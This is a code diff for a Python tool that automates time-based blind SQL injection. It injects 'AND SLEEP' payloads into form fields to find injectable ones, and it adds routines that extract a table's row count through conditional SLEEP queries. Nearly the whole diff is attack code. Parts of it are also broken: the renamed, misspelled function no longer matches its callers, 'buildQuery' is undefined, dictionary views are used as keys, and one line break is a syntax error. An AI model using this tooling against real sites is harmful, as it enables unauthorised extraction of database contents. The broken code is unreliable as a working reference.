@@ -79,7 +79,9 @@ def meanTime(times):
 def measureServerResponseTime(url, method, headers = {}, cookies = {}, data = {}):
 	return measureRequestTime(makeRequest(url, method, headers, cookies, data))
 
-def measureMeanServerResponseTime(url, method, headers = {}, cookies = {}, data = {}, threadsNum = 1):
+def measureMeanServerResponseTime(url, method, headers = {}, cookies = {}, data = {}):
+	global threadsNum
+
 	if threadsNum <= 1:
 		return measureServerResponseTime(url, method, headers, cookies, data)
 	else:
@@ -93,10 +95,10 @@ def measureMeanServerResponseTime(url, method, headers = {}, cookies = {}, data 
 			t.join()
 		return meanTime(times)
 
-def measureMeanServerResponseTimePrecise(url, method, headers = {}, cookies = {}, data = {}, roundsNum = 1, threadsNum = 1):
+def measureMeanServerResponseTimePrecise(url, method, headers = {}, cookies = {}, data = {}, roundsNum = 1):
 	times = []
 	for i in range(roundsNum):
-		times.append(measureMeanServerResponseTime(url, method, headers, cookies, data, threadsNum))
+		times.append(measureMeanServerResponseTime(url, method, headers, cookies, data))
 	return meanTime(times)
 
 def sleepTime(serverResponseTime):
@@ -109,16 +111,17 @@ def sleepTime(serverResponseTime):
 	elif response_time >= 5:
 		return response_time * 0.5
 
+
+# Checks if a form field is vulnerable
+# Correctly forged data are passed to this function to test if the field is injectable
 def isVulnerable(url, method, headers, cookies, data):
 	global sleepTime
-	global threadsNum
 
 	if measureMeanServerResponseTime(url, method, headers, cookies, data) >= sleepTime:
 		return True
 	return False
 
-def testFieldVulnerabilities(url='', method='', headers='', cookies='', field='', data=''):
-	global threadsNum
+def seacrhFieldVulnerabilities(url, method, headers, cookies, field, data):
 	mData = data.copy()
 	sql	  = '{} AND SLEEP({}) {}'
 
@@ -129,10 +132,12 @@ def testFieldVulnerabilities(url='', method='', headers='', cookies='', field=''
 				suff.format(q, q, q)
 			mData[field] = data[field] + sql.format(q, sleepTime, suff)
 			if isVulnerable(url, method, headers, cookies, mData):
-				return [q, s]
+				return {'quoteType':q, 'suffixType': suff}
 	return None
 
-def searchVulnerableFields(url, method, headers, cookies, data, sleepTime):
+
+# Generates a dictionary with fields as key and a list [quote_type, suffix_type]
+def searchVulnerableFields(url, method, headers, cookies, data):
 	vulnerableFields = {}
 	for field in data:
 		vulnerabilities = testFieldVulnerabilities(url, method, headers, cookies, field, data)
@@ -140,6 +145,37 @@ def searchVulnerableFields(url, method, headers, cookies, data, sleepTime):
 			vulnerableFields.update({field:vulnerabilities})
 
 	return vulnerableFields
+
+
+def buildSqlInjection(query, operand, value, vulnerabilityType):
+	global sleepTime
+	return '{} AND IF(({}){}{},SLEEP({}),SLEEP(0)) {}'
+		.format(vulnerabilityType['quoteType'], query, operand, value, sleepTime, vulnerabilityType['suffixType'])
+
+
+# vulnerableField --> {vulnerableField:{'quoteType':q, 'suffixType':suff}}
+def searchTableRowsCount(url, method, headers, cookies, data, vulnerableField, dbName, tableName, whereParams = {}):
+	global sleepTime
+	mData = data.copy()
+	mTableName = '%s.%s' % (dbName, tableName)
+
+	query = buildQuery()
+
+
+	found = False
+	count = 0
+
+
+	while not found:
+		mData[vulnerableField.keys()] = data[vulnerableField.keys()] + buildSqlInjection(query, '=', str(count), vulnerableField.values())
+
+		if measureMeanServerResponseTime(url, method, headers, cookies, mData) >= sleepTime:
+			found = True
+		else:
+			count += 1
+
+	return count	
+
 
 def main(argv):
 	parser = argparse.ArgumentParser(description = '')
